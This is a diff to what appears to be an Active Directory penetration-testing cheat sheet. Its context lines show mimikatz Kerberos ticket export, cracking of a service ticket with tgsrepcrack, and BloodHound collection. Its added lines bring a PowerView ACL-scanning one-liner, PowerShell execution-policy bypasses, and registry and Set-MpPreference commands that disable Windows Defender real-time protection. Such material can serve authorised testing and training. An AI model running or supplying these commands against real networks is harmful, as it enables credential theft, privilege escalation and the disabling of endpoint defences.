@@ -144,7 +144,7 @@ mimikatz # kerberos::list /export
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.hitmanalharbi.local~1433-boo.LOCAL.kirbi  
 ```
 
-**[+] Kerberos Double-Hop problem**
+**[+] Kerberos Double-Hop problem (powershell)**
 
 ```
 Invoke-Command -ComputerName UFC-JUMPSRV -Credential $cred -ScriptBlock {
@@ -206,6 +206,13 @@ smbclient -L IP
 Invoke-BloodHound -CollectionMethod All
 ```
 
+**[+] Find interesting ACLs for specific user (Need PowerView.ps1)**
+
+```
+Invoke-ACLScanner -ResolveGUID | ? {$_.IdentityReferenceName -like "*jumpsrv*"}
+```
+
+
 &nbsp;
 &nbsp;
 
@@ -218,6 +225,8 @@ Invoke-BloodHound -CollectionMethod All
 **[+] Bypass Powershell Execution Policy**
 
 ```
+In Powershell you can write:
+
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted
 
 or run powershell like this:
@@ -228,7 +237,11 @@ powershell.exe -ep bypass
 **[+] Disable windows defender**
 
 ```
+// Registry 
+
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1
+
+// Powershell
 
 powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
 ```
